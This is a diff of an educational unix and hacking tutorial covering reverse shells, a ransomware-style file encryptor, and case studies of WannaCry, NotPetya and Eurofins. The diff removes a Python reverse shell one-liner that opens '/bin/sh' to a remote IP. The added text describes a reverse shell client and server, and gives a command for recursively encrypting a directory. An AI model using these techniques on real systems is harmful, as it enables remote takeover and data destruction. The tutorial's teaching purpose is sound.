@@ -128,7 +128,7 @@ unix was an early operating system developed in Bell Labs in the 1970's that emp
 
 ## some more handy commands
 * ```find``` - **find files** - ```find . ``` will recursively list the files downstream from ```.``` --current directory - ```.``` can be replaced with any directory. Looking for something specific? try this: ```find . -name hello.py```. for broader searches, replacing ```-name``` with ```-iname``` renders the search case insensitive. the wildcard character ```*``` is useful here, it will match any number of any characters, so if we're looking for ```.py``` files then we can run ```find . -name *py```
-* ```grep``` - regular expression search (text search) - ```grep unix readme.md``` will search and return all instances of "unixx" in the readme file. ```grep -i unix readme.md``` will make the search case insensitive. ```grep unix *``` will search for "unix" in all files in this directory. ```grep -r unix *``` will recursively search through directories and files for "unix". ```grep``` can read from stdin too, for example ```ls | grep readme```` will filter the results of ```ls``` by the search term "readme"
+* ```grep``` - regular expression search (text search) - ```grep unix readme.md``` will search and return all instances of "unixx" in the readme file. ```grep -i unix readme.md``` will make the search case insensitive. ```grep unix *``` will search for "unix" in all files in this directory. ```grep -r unix *``` will recursively search through directories and files for "unix". ```grep``` can read from stdin too, for example ```ls | grep readme``` will filter the results of ```ls``` by the search term "readme"
 
 
 ## ```curl``` & ```wget``` - download data
@@ -405,7 +405,9 @@ in this session we'll look at some common attacks so we can better understand th
 1. establish persistent access to the machine
 2. deliver the payload - the attack itself
 
-note that this tutorial is for education only! don't attack anyone without permission! 
+**note that this tutorial is for education only! don't attack anyone without permission! **
+
+**also note: i'm not an expert!** 
 
 ## persistent access
 to ensure that they can continue to access the compromised machine, the attacker will need a way in that's robust to changing passwords. in the case of the attack on my machine, the attacker changed the password of the compromised account. that's one way of doing it, but will be discovered when the legitimate user of the compromised account tries to log in again. 
@@ -415,34 +417,50 @@ another way to gain persistent access to a machine is to create a backdoor - a h
 ### reverse shells
 a shell is a program that lets users send commands to the machine, like the terminal for example. in this series of sessions we've learnt about ```ssh``` - the secure shell - remote access to a command line. this is a forward shell, where the host machine runs an ```ssh``` daemon (a program that runs in the background) which allows incoming connections to the machine from users. in forward shells, the connection is initiated by the user. conversely a reverse shell connection is initiated by the host. the significance of this is that the shell connection can bypass a firewall that protects the host machine from incoming connections. 
 
-reverse shells come in different forms and tend to be very simple, which can make them hard to identify in system monitors like ```htop```. let's look at a simple way to make a reverse shell in python!
+in ```hacking/``` in this repository, i've put together a quaint reverse shell client  and server, written in python using only the built in libraries. that's important because installing python libraries on a target's machine will attract attention. here are the libraries involved & what I'm using them for:
+- ```socket``` - network interface
+- ```os``` - operating system commands (e.g. changing directories)
+- ```subprocess``` - execute shell commands from python
+- ```sys``` - reading extra command line input into the program (ip addresses and port number)
+in practice, the attacker would run ```server.py``` on their own machine ahead of time, ready for ```client.py``` to be run on the target machine and connect to ```server.py```. ```server.py``` prompts a text input from the attacker, which is sent to ```client.py``` and executed as a shell command.
 
-```python
-$ python -c 'import socket,subprocess,os;\
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
-s.connect(("10.0.0.123",1111));\
-os.dup2(s.fileno(),0);\
-os.dup2(s.fileno(),1);\
-os.dup2(s.fileno(),2);\
-p=subprocess.call(["/bin/sh","-i"]);'
-```
+as long as both ```server.py``` & ```client.py``` are both running, the connection should remain open, at least that's the case with a well engineered reverse shell. 
+#### try this
+open two terminals and try running both ```server.py``` and ```client.py``` - can you send commands from server to client? can you run a python program from the reverse shell? have you found any bugs!?
 
-
-
-## backdoors and ransomware
-as attackers, we can do more than just steal information. we can ensure our persistent access to our victims' machine by creating a backdoor - a secret access portal to the victims' machine. This way, if our victim changes their password we'll still have a way in. 
-persistent access will allow us to:
-- monitor the victim
-- steal more data
-- attack the user even more
-- use the victims machine to attack other machines
-## backdoors
 ## ransomware
-ransomware attacks encrypt a victim's data, who will be prompted to pay a ransom to have the the data decrypted. these attacks can devestate companies and organisations, who can be unable to operate during the atttack. generally it's advised not to pay the attackers, since there is no way to garuntee that the files will be decrypted after the payment is made. the payment will also fund the next attack on another company. 
+ransomware is a common attack that encrypts a victim's data, who will be prompted to pay a ransom to have the the data decrypted. these attacks can devestate companies and organisations, who can be unable to operate during the atttack. generally it's advised not to pay the attackers, since there is no way to garuntee that the files will be decrypted after the payment is made. the payment will also fund the next attack on another company. 
 ### wannacry
-wannacry is a famous ransomware worm that spread around the world in ### 2015??### crippling companies and organisations  - including the NHS.
-- eternal blue - nsa / shadow brokers
-- spread, nhs
-- deactivation
+wannacry was a crytoworm that spread indiscriminately across the world in 2017, exploiting a newly revlealed vulnerability in windows operating systems called ```eternal blue```. it spread quickly across the planet, affecting millions of machines, including many machines in the NHS. the worm demanded a payment in bitcoin for the files to be decrypted. It was stopped by security ressearcher Marcus Hutchins, who discovered a kill switch and activated it. wannacry caused billions of dollars of financial damage, as well as the human cost of crippling a health system. [https://en.wikipedia.org/wiki/WannaCry_ransomware_attack](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack)
 ### maersk -  petya / notpetya
+maersk, a global shipping company was hit with a large scale, targeted ransomware attack in 2017. attackers gained access to the maersk network with the ```eternal blue``` vulnerability, just like wannacry. the ransomware program dubbed ```notpetya``` from the [petya](https://en.wikipedia.org/wiki/Petya_(malware)) family of ransomwares. their backups were also on the same network and were also hit. [https://www.reuters.com/article/us-cyber-attack-maersk-idUSKBN19I1NO](https://www.reuters.com/article/us-cyber-attack-maersk-idUSKBN19I1NO) 
+a good talk from the maersk head of cyber security gives a good talk about the incident here: [https://www.youtube.com/watch?v=wQ8HIjkEe9o&t=2214s&ab_channel=BlackHat](https://www.youtube.com/watch?v=wQ8HIjkEe9o&t=2214s&ab_channel=BlackHat)
 ### eurofins
+in 2019, eurofins scientific was crippled with a ransomware attack that halted their operations for some time. eurofins paid an undisclosed ammount to the attackers [https://www.bbc.co.uk/news/uk-48881959](https://www.bbc.co.uk/news/uk-48881959) 
+### how does it work?
+```hacking/crybaby.py``` is a really simple file encryptor written in python. once again, it only uses the python standard libraries for cross platform compatibility. those libraries are:
+- ```os``` - for finding paths to target files, and for deleting the unencrypted files 
+- ```cryptography``` - for encryption!
+- ```argparse``` - for organizing command line inputs, so we can make our simple program into a multifunctional tool.
+
+here's a use example:
+```sh
+$ python crybaby.py -e -d test/ -k Je5Y0wVwUb0sL_na_DVjar35WyWAQbzXvse0Z-9fNj4=
+```
+where the arguments ```-e``` triggers encryption mode, else it will fall back to attempting decryption. ```-d <dirname>``` specifies the directory to start recurisvely encrypting all files from. in this case a test folder, but in practice a ```/home``` directory. ```-k``` expects either the name of an existing key file or a paste of the encryption key as a string.
+
+it uses ```os.walk(...)``` to walk through all files downstream of ```test/``` and encrypt them. I'd love to tell you more about encryption but i know next to nothing about it!
+
+the decryption operation is the same, only without the ```-e``` flag.
+
+**be very careful with this!!**  you could accidently encrypt yours or someone else's data! if you lose the key, then it's gone forever! if you don't have permission then it's illegal!
+
+### shortcomings of ```crybaby.py```
+- ```crybaby.py``` does nothing to try to hide the encryption key. since the encryption is symetric it can be reversed with the same key. 
+
+# staying safe!
+a pattern in the cyber attacks mentioned is the ```eternal blue``` vulnerability. both the maersk and wannacry attacks happened very shortly after the ```eternal blue``` was revealed to the world. it's therefore important to stay aware of vulnerability discoveries and **update your software!!** 
+
+it's also important to keep backups that are insulated from the effect of attacks, like on a different network, or keeping offline copies.
+
+passwords! make sure your password is strong and that you don't re-use it between sites. data breaches are fairly common and your passwords could be in someone else's hands right now!! use a password manager to keep track of these passwords. ```keepass``` is a good (free) option.
